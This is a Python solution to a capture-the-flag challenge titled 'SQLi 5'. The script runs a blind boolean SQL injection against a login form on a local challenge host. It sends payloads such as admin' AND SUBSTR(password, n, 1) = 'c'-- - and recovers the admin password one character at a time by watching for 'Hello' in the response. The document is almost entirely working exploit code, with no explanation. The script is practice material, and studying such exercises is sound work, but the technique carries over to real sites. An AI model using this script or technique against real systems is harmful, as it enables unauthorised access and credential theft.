### SQLi 5

```python
import string
import requests

searchspace = ''.join(chr(i) for i in range(32, 127)) 
solution = ''
url = "http://challenge.localhost:80"

while True:
    found = False
    for char in searchspace:
        payload = f"admin' AND SUBSTR(password, {len(solution)+1}, 1) = '{char}'-- -"
        data = {
            "username": payload,
            "password": "irrelevant"
        }

        response = requests.post(url, data=data)

        if "Hello" in response.text:
            solution += char
            print(f"[+] Found so far: {solution}")
            found = True
            break

    if not found:
        print("[*] Done. Final password:", solution)
        break
```

